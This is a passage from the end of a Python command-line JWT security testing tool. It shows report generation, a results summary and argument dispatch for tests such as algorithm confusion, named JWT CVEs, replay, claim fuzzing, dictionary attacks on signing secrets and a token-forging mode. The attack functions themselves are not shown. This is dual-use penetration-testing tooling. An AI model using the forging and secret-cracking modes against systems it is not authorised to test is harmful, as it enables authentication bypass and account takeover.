            "🔒 Use strong algorithms (RS256, ES256)",
            "📋 Include all required claims (exp, iat, iss, aud)"
        ])
        
        report["recommendations"] = recommendations
        
        # Save report
        if output_file is None:
            output_file = f"jwt_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"✅ Report saved: {output_file}")
        return output_file
    
    def print_summary(self, results: Dict[str, Any]):
        """Print a summary of test results."""
        print("\n" + "=" * 60)
        print("📋 JWT Security Test Summary")
        print("=" * 60)
        
        summary = results["summary"]
        print(f"🔍 Total Vulnerabilities: {summary['total_vulnerabilities']}")
        print(f"🚨 Critical: {summary['critical']}")
        print(f"⚠️ High: {summary['high']}")
        print(f"🔶 Medium: {summary['medium']}")
        print(f"🔵 Low: {summary['low']}")
        print(f"🎯 Overall Risk: {summary['overall_risk']}")
        
        if summary['total_vulnerabilities'] == 0:
            print("\n✅ No vulnerabilities found! JWT appears secure.")
        else:
            print(f"\n❌ {summary['total_vulnerabilities']} vulnerabilities found. Review detailed results.")

def main():
    """Main function for JWT Security Tester."""
    parser = argparse.ArgumentParser(description="JWT Security Testing Tool")
    parser.add_argument("--token", help="JWT token to test")
    parser.add_argument("--secret", help="Secret key for signature verification")
    parser.add_argument("--public-key", help="Public key for RS/ES algorithm testing")
    parser.add_argument("--jwks-url", help="JWKS URL for key validation")
    parser.add_argument("--wordlist", help="Wordlist file for dictionary attack")
    parser.add_argument("--file", help="File containing JWT tokens (one per line)")
    parser.add_argument("--output", help="Output file for report")
    parser.add_argument("--test", choices=["structure", "algorithm", "signature", "claims", "tampering", "replay", 
                       "cve", "fuzzing", "timestamps", "dictionary", "jwks", "generate-keys", "forge", "all"], 
                       default="all", help="Specific test to run")
    parser.add_argument("--max-attempts", type=int, default=1000, help="Maximum attempts for dictionary attack")
    parser.add_argument("--key-size", type=int, default=2048, help="RSA key size for generation")
    parser.add_argument("--curve", choices=["P-256", "P-384", "P-521"], default="P-256", help="ECDSA curve for generation")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode with detailed logging")
    
    args = parser.parse_args()
    
    # Setup debug logging
    setup_debug_logging(args.debug)
    debug_print("JWT Security Tester starting", args.debug)
    debug_print(f"Arguments: {vars(args)}", args.debug)
    
    tester = JWTSecurityTester(debug=args.debug)
    
    if args.token:
        # Test single token
        print("🔒 JWT Security Testing Tool")
        print("=" * 40)
        
        if args.test == "all":
            results = tester.comprehensive_test(args.token, args.secret, args.public_key)
        elif args.test == "generate-keys":
            # Generate key pairs
            print("🔐 Generating key pairs...")
            rsa_keys = tester.generate_rsa_key_pair(args.key_size)
            ecdsa_keys = tester.generate_ecdsa_key_pair(args.curve)
            
            if "error" not in rsa_keys:
                print(f"✅ RSA {args.key_size}-bit key pair generated")
                with open(f"rsa_private_{args.key_size}.pem", "w") as f:
                    f.write(rsa_keys["private_key"])
                with open(f"rsa_public_{args.key_size}.pem", "w") as f:
                    f.write(rsa_keys["public_key"])
            
            if "error" not in ecdsa_keys:
                print(f"✅ ECDSA {args.curve} key pair generated")
                with open(f"ecdsa_private_{args.curve}.pem", "w") as f:
                    f.write(ecdsa_keys["private_key"])
                with open(f"ecdsa_public_{args.curve}.pem", "w") as f:
                    f.write(ecdsa_keys["public_key"])
            
            return
        elif args.test == "forge":
            # Forge token with custom payload
            if not args.token:
                print("❌ Token required for forging")
                return
            
            header, payload, signature = tester.decode_token_without_verification(args.token)
            forged = tester.forge_token(payload, "HS256", args.secret)
            if "error" not in forged:
                print(f"✅ Forged token: {forged['forged_token']}")
            else:
                print(f"❌ Forging failed: {forged['error']}")
            return
        else:
            # Run specific test
            if args.test == "structure":
                results = {"tests": {"structure_analysis": tester.analyze_token_structure(args.token)}}
            elif args.test == "algorithm":
                results = {"tests": {"algorithm_confusion": tester.test_algorithm_confusion(args.token)}}
            elif args.test == "signature":
                results = {"tests": {"signature_verification": tester.test_signature_verification(args.token, args.secret)}}
            elif args.test == "claims":
                results = {"tests": {"claim_validation": tester.test_claim_validation(args.token)}}
            elif args.test == "tampering":
                results = {"tests": {"token_tampering": tester.test_token_tampering(args.token)}}
            elif args.test == "replay":
                results = {"tests": {"replay_attack": tester.test_replay_attack(args.token)}}
            elif args.test == "cve":
                results = {"tests": {
                    "cve_2015_2951_alg_none": tester.test_cve_2015_2951_alg_none(args.token),
                    "cve_2016_10555_rs_hs256": tester.test_cve_2016_10555_rs_hs256(args.token, args.public_key),
                    "cve_2018_0114_key_injection": tester.test_cve_2018_0114_key_injection(args.token),
                    "cve_2019_20933_blank_password": tester.test_cve_2019_20933_blank_password(args.token),
                    "cve_2020_28042_null_signature": tester.test_cve_2020_28042_null_signature(args.token),
                    "cve_2022_21449_psychic_signature": tester.test_cve_2022_21449_psychic_signature(args.token)
                }}
            elif args.test == "fuzzing":
                results = {"tests": {"claim_fuzzing": tester.test_claim_fuzzing(args.token)}}
            elif args.test == "timestamps":
                results = {"tests": {"timestamp_tampering": tester.test_timestamp_tampering(args.token)}}
            elif args.test == "dictionary":
                results = {"tests": {"dictionary_attack": tester.test_dictionary_attack(args.token, args.wordlist, args.max_attempts)}}
            elif args.test == "jwks":
                results = {"tests": {"jwks_validation": tester.test_jwks_validation(args.token, args.jwks_url)}}
        
        tester.print_summary(results)
        
        if args.output:
            tester.generate_report(results, args.output)
    
    elif args.file:
        # Test multiple tokens from file
        print("🔒 JWT Security Testing Tool - Batch Mode")
        print("=" * 50)
        
        try:
            with open(args.file, 'r') as f:
                tokens = [line.strip() for line in f if line.strip()]
            
            print(f"📁 Testing {len(tokens)} tokens from {args.file}")
            
            all_results = []
            for i, token in enumerate(tokens, 1):
                print(f"\n🔍 Testing token {i}/{len(tokens)}")
                results = tester.comprehensive_test(token, args.secret)
                all_results.append(results)
            
            # Generate combined report
            combined_report = {
                "batch_report": {
                    "title": "JWT Security Batch Analysis",
                    "generated_date": datetime.now().isoformat(),
                    "tokens_tested": len(tokens),
                    "results": all_results
                }
            }
            
            output_file = args.output or f"jwt_batch_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(output_file, 'w') as f:
                json.dump(combined_report, f, indent=2)
            
            print(f"\n✅ Batch report saved: {output_file}")
            
        except FileNotFoundError:
            print(f"❌ File not found: {args.file}")
            sys.exit(1)
    
    else:
        # Interactive mode
        print("🔒 JWT Security Testing Tool - Interactive Mode")
        print("=" * 50)
        
        while True:
            token = input("\nEnter JWT token (or 'quit' to exit): ").strip()
            if token.lower() == 'quit':
                break
            
            if not token:
                print("❌ Please enter a valid JWT token")
                continue
            
            try:
                results = tester.comprehensive_test(token)
                tester.print_summary(results)
                
                save_choice = input("\nSave report? (y/n): ").lower().strip()
                if save_choice == 'y':
                    output_file = input("Enter output filename (or press Enter for default): ").strip()
                    if not output_file:
                        output_file = None
                    tester.generate_report(results, output_file)
                
            except Exception as e:
                print(f"❌ Error testing token: {str(e)}")
        
        print("\n👋 Thank you for using JWT Security Testing Tool!")

if __name__ == "__main__":
    main() 